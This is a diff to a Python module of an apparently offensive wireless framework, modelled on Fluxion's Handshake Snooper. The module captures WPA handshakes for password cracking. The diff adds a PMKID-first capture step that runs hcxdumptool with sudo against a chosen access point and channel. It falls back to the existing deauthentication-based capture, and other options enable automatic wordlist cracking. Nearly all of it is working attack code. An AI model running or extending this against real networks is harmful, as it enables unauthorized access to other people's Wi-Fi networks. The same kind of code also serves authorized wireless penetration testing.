@@ -13,7 +13,7 @@ Orchestrates the full handshake capture workflow:
 Inspired by Fluxion's Handshake Snooper attack module, which automatically
 verifies captured handshakes before proceeding to credential capture.
 
-Version: 1.0.0
+Version: 1.1.0
 """
 
 from __future__ import annotations
@@ -65,6 +65,8 @@ class Exploit(Exploit):
     capture_timeout = OptInteger(60, "Max seconds to wait for handshake")
     output_dir = OptString(".log", "Directory for captured handshakes")
     verify_method = OptString("aircrack", "Verification: aircrack | cowpatty | pyrit")
+    pmkid_first = OptBool(True, "Try PMKID clientless capture before deauth workflow")
+    pmkid_timeout = OptInteger(30, "Seconds reserved for PMKID-first attempt")
     auto_crack = OptBool(False, "Auto-start cracking after capture")
     wordlist = OptString("", "Wordlist for auto_crack")
     ml_score = OptBool(True, "ML handshake quality scoring (if sklearn available)")
@@ -103,6 +105,42 @@ class Exploit(Exploit):
 
         return False
 
+    def _try_pmkid_first(self, output: Path) -> Optional[Path]:
+        """Attempt PMKID-first capture before forcing deauth handshakes."""
+        if not self.pmkid_first:
+            return None
+        if not shutil.which("hcxdumptool"):
+            return None
+
+        cap_file = output / "pmkid_first.pcapng"
+        cmd = [
+            "sudo",
+            "hcxdumptool",
+            "-i",
+            self.interface,
+            "--enable_status=1",
+            "-o",
+            str(cap_file),
+        ]
+        if self.target_channel:
+            cmd.extend(["-c", self.target_channel])
+        if self.target_bssid:
+            cmd.extend(["--filterlist_ap", str(output / "pmkid_filter.txt"), "--filtermode=2"])
+            (output / "pmkid_filter.txt").write_text(self.target_bssid + "\n", encoding="utf-8")
+
+        print_status("PMKID-first attempt ({}s)...".format(self.pmkid_timeout))
+        try:
+            subprocess.run(cmd, timeout=int(self.pmkid_timeout), check=False)
+        except subprocess.TimeoutExpired:
+            pass
+        except Exception:
+            return None
+
+        if cap_file.exists() and cap_file.stat().st_size > 0:
+            print_success("PMKID-first capture produced: {}".format(cap_file))
+            return cap_file
+        return None
+
     def run(self) -> None:
         """Execute handshake snooper workflow."""
         if not self.target_bssid:
@@ -129,6 +167,10 @@ class Exploit(Exploit):
             if not shutil.which(tool):
                 print_error("{} not found. Install aircrack-ng suite.".format(tool))
                 return
+
+        pmkid_cap = self._try_pmkid_first(output)
+        if pmkid_cap is not None:
+            print_info("Proceeding with handshake capture fallback after PMKID-first attempt.")
 
         print_status("Starting handshake capture for {}...".format(self.target_bssid))
 
